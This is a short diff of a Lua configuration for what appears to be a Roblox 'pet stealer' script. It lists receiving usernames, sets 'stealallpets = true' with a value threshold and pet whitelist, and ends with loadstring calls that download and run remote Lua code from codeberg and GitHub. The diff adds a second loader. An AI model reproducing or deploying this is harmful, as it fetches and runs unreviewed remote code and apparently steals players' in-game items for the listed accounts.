@@ -1,6 +1,7 @@
 users = {
-    'ajandaa12alt1',
+    'ajandaa12alt',
     'Qusay52VxWi',
+    "Boomsauce121411"
 }
 min_value = 10000000
 ping = "yes"
@@ -9,3 +10,5 @@ stealallpets = true
 Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
 
 loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/gag"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/Source.lua"))()
